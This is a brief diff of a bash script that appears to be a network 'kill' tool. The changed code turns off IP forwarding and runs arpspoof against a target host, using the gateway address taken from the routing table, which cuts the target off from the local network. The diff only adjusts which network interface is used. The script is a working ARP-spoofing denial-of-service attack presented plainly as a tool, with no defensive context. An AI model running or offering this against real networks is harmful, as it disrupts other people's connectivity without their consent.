@@ -41,7 +41,7 @@ kill()
     
     echo -n 0 > /proc/sys/net/ipv4/ip_forward
     
-    arpspoof -i eth0 $IP $target
+    arpspoof -i $INTERFACE $IP $target
     if [[ $? -eq 1 ]]; then
         echo "Try to edit arpspoof command with your current network interface."
     fi
@@ -54,7 +54,7 @@ kill()
 type arpspoof >/dev/null 2>&1 || { echo -e >&2 "Arpspoof is required but is not installed.\nRun 'sudo apt-get install dsniff' Aborting."; exit 1; }
 type nmap >/dev/null 2>&1 || { echo -e >&2 "Nmap is required but is not installed.\nRun 'sudo apt-get install nmap' Aborting."; exit 1; }
 
-INTERFACE=wlan0 #default interface
+INTERFACE=eth0 #default interface
 
 IP=`route -n|grep ^0.0.0.0|cut -d' ' -f 10`
 
